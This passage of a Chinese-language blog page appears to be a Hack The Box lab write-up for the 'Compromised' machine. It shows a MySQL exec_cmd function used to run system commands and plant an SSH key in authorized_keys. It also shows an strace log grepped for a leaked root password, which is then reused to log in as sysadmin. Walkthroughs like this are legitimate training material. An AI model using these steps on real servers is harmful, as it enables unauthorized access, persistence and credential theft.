+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@localhost SQL&gt; select * from mysql.func;</span><br><span class="line"> </span><br><span class="line">+----------+---+-------------+----------+</span><br><span class="line">| exec_cmd | 0 | libmysql.so | function |</span><br><span class="line">+----------+---+-------------+----------+</span><br><span class="line">root@localhost SQL&gt; select exec_cmd(&quot;id&quot;);</span><br><span class="line"> </span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| uid&#x3D;111(mysql) gid&#x3D;113(mysql) groups&#x3D;113(mysql) |</span><br><span class="line">|                                                 |</span><br><span class="line">+-------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>我们可以给mysql用户写入authorized_keys</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@localhost SQL&gt; select exec_cmd(&quot;mkdir &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;.ssh&quot;);                                                                                                                         </span><br><span class="line"> </span><br><span class="line">+--+</span><br><span class="line">|  |</span><br><span class="line">+--+</span><br><span class="line">root@localhost SQL&gt; select exec_cmd(&quot;echo -n &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDlN+z24lH9+JSjrjFNH61CsTBn2wfjluBJpkeQnn9w7H0JvudEutXwcP2upNhaMuYDcuzL4cVsHYZWje3ebD8nOLD56HDnbFk23ZK1Thnh6demMhnmmk+sb9MVbQHL2DoCR7&#x2F;D0D&#x2F;s0xOUYteSoIzAxQR2ccE19FK8if4O+9Pehqm56yvaXjGoMO+Y7uIsYHtsVqwwPvIb9lcHjFikceszbbgV67ct0wrfiHvwnlJ9AyblcogDtygI1LwegjRm923EFCbEDCnSsFGHTDBf7dN&#x2F;Kfrbl&#x2F;FV&#x2F;1uo</span><br><span class="line">K3XrADO7v7jhaoufRWJnKUA+f0FD677LLMaIjZJSAO9OQQOD047Olesj5YoX4&#x2F;i8q21nl0XjR6Fi3SP9WJYb6tocsmUlfLktJLdtXvWYYKxytGJLVk2JcDdpHlxPY8UgLcGw16A8i4udQx5dt3jXS0O6z2HDv6PIRtbdjFEUWJQZiSk8vTPJMrNBniu</span><br><span class="line">iOSpRjpyPZ+nxST4j5y5h43xgKyXRTFslQ50&#x3D; root@kali&#39; &gt;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;.ssh&#x2F;authorized_keys&quot;);</span><br><span class="line"> </span><br><span class="line">+--+</span><br><span class="line">|  |</span><br><span class="line">+--+</span><br><span class="line">root@localhost SQL&gt; select exec_cmd(&quot;chmod 600 &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;.ssh&#x2F;authorized_keys&quot;);                                                                                                      </span><br><span class="line"> </span><br><span class="line">+--+</span><br><span class="line">|  |</span><br><span class="line">+--+</span><br></pre></td></tr></table></figure>
+
+<p>之后ssh连接即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mysql@10.10.10.207</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Compromised/25.png" alt="25"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>复制linpeas文本到机器上执行，这个过程用vim会比较卡，耐心等待</p>
+<p>之后发现root创建的文件，但是mysql组可读</p>
+<p><img src="/images/Compromised/27.png" alt="27"></p>
+<p>这个文件的内容很多，看样子是<code>strace</code>记录，<code>strace</code>也被攻击者用来作为键盘记录器:<a target="_blank" rel="noopener" href="https://www.securitynik.com/2014/04/the-poor-mans-keylogger-strace.html">链接</a></p>
+<p>在这个文件中，找到了疑似其他用户执行mysql时记录到的密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql@compromised:&#x2F;tmp$ cat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;strace-log.dat |grep password</span><br><span class="line">22102 03:11:06 write(2, &quot;mysql -u root --password&#x3D;&#39;3*NLJE&quot;..., 39) &#x3D; 39</span><br><span class="line">22227 03:11:09 execve(&quot;&#x2F;usr&#x2F;bin&#x2F;mysql&quot;, [&quot;mysql&quot;, &quot;-u&quot;, &quot;root&quot;, &quot;--password&#x3D;3*NLJE32I$Fe&quot;], 0x55bc62467900 &#x2F;* 21 vars *&#x2F;) &#x3D; 0</span><br><span class="line">22227 03:11:09 write(2, &quot;[Warning] Using a password on th&quot;..., 73) &#x3D; 73</span><br><span class="line">22102 03:11:10 write(2, &quot;mysql -u root --password&#x3D;&#39;3*NLJE&quot;..., 39) &#x3D; 39</span><br><span class="line">22228 03:11:15 execve(&quot;&#x2F;usr&#x2F;bin&#x2F;mysql&quot;, [&quot;mysql&quot;, &quot;-u&quot;, &quot;root&quot;, &quot;--password&#x3D;changeme&quot;], 0x55bc62467900 &#x2F;* 21 vars *&#x2F;) &#x3D; 0</span><br><span class="line">22228 03:11:15 write(2, &quot;[Warning] Using a password on th&quot;..., 73) &#x3D; 73</span><br><span class="line">22102 03:11:16 write(2, &quot;mysql -u root --password&#x3D;&#39;change&quot;..., 35) &#x3D; 35</span><br><span class="line">22229 03:11:18 execve(&quot;&#x2F;usr&#x2F;bin&#x2F;mysql&quot;, [&quot;mysql&quot;, &quot;-u&quot;, &quot;root&quot;, &quot;--password&#x3D;changethis&quot;], 0x55bc62467900 &#x2F;* 21 vars *&#x2F;) &#x3D; 0</span><br><span class="line">22229 03:11:18 write(2, &quot;[Warning] Using a password on th&quot;..., 73) &#x3D; 73</span><br><span class="line">22232 03:11:52 openat(AT_FDCWD, &quot;&#x2F;etc&#x2F;pam.d&#x2F;common-password&quot;, O_RDONLY) &#x3D; 5</span><br><span class="line">22232 03:11:52 read(5, &quot;#\n# &#x2F;etc&#x2F;pam.d&#x2F;common-password -&quot;..., 4096) &#x3D; 1440</span><br><span class="line">22232 03:11:52 write(4, &quot;[sudo] password for sysadmin: &quot;, 30) &#x3D; 30</span><br></pre></td></tr></table></figure>
+
+<p>尝试密码复用到用户<code>sysadmin</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh sysadmin@10.10.10.207</span><br><span class="line">3*NLJE32I$Fe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Compromised/28.png" alt="28"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Linux%E9%9D%B6%E6%9C%BA/" rel="tag"># Linux靶机</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/31/HTB-Cache/" rel="prev" title="HTB:Cache">
+      <i class="fa fa-chevron-left"></i> HTB:Cache
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/06/01/HTB-Aragog/" rel="next" title="HTB:Aragog">
+      HTB:Aragog <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.</span> <span class="nav-text">枚举</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%951-bypass-disable-functions"><span class="nav-number">2.1.</span> <span class="nav-text">方法1 bypass disable_functions</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#chankro-%E5%A4%B1%E8%B4%A5"><span class="nav-number">2.1.1.</span> <span class="nav-text">chankro(失败)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UAF"><span class="nav-number">2.1.2.</span> <span class="nav-text">UAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#debug-backtrace-%E6%88%90%E5%8A%9F"><span class="nav-number">2.1.3.</span> <span class="nav-text">debug_backtrace(成功)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gc-collect-cycle-%E6%88%90%E5%8A%9F"><span class="nav-number">2.1.4.</span> <span class="nav-text">gc_collect_cycle(成功)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AntSword"><span class="nav-number">2.1.5.</span> <span class="nav-text">AntSword</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AA%E5%AE%8C%E6%88%90Reverse-Shell-iptables-bypass"><span class="nav-number">2.1.6.</span> <span class="nav-text">未完成Reverse_Shell(iptables bypass)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%952-%E8%BF%9E%E6%8E%A5mysql"><span class="nav-number">2.2.</span> <span class="nav-text">方法2 连接mysql</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#user"><span class="nav-number">3.1.</span> <span class="nav-text">user</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="EvilArsene"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">EvilArsene</p>
+  <div class="site-description" itemprop="description">人格面具操控者 <img src="http://www.hackthebox.eu/badge/image/278745" alt="Hack The Box"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">166</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/TZESS" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;TZESS" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Arsene_IP" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Arsene_IP" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilArsene</span>
+</div>
+
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+		var t1 = Date.UTC(2018,02,13,15,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已安全运行"+(diffYears-2)+" 年 "+diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+	siteTime();
+</script>
+
+<script>
+console.log(`%c
+. . . . . . . . . . . . . . . . . . . . . . . . . . .
+.                                                   .
+.                      uuuuuuu                      .
+.                  uu$$$$$$$$$$$uu                  .
+.               uu$$$$$$$$$$$$$$$$$uu               .
+.              u$$$$$$$$$$$$$$$$$$$$$u              .
+.             u$$$$$$$$$$$$$$$$$$$$$$$u             .
+.            u$$$$$$$$$$$$$$$$$$$$$$$$$u            .
+.            u$$$$$$$$$$$$$$$$$$$$$$$$$u            .
+.            u$$$$$$"   "$$$"   "$$$$$$u            .
+.            "$$$$"      u$u       $$$$"            .
+.             $$$u       u$u       u$$$             .
+.             $$$u      u$$$u      u$$$             .
+.              "$$$$uu$$$   $$$uu$$$$"              .
+.               "$$$$$$$"   "$$$$$$$"               .
+.                 u$$$$$$$u$$$$$$$u                 .
+.                  u$"$"$"$"$"$"$u                  .
+.       uuu        $$u$ $ $ $ $u$$       uuu        .
+.      u$$$$        $$$$$u$u$u$$$       u$$$$       .
+.       $$$$$uu      "$$$$$$$$$"     uu$$$$$$       .
+.     u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$     .
+.     $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"     .
+.      """      ""$$$$$$$$$$$uu ""$"""              .
+.                uuuu ""$$$$$$$$$$uuu               .
+.       u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$      .
+.       $$$$$$$$$$""""           ""$$$$$$$$$$$"     .
+.        "$$$$$"                      ""$$$$""      .
+.          $$$"                         $$$$"       .
+.                                                   .
+.               Welcome to Console ;)               .
+. . . . . . . . . . . . . . . . . . . . . . . . . . .`,"color:#9acc14; background:black; font-family: monospace");
+</script>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
+
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
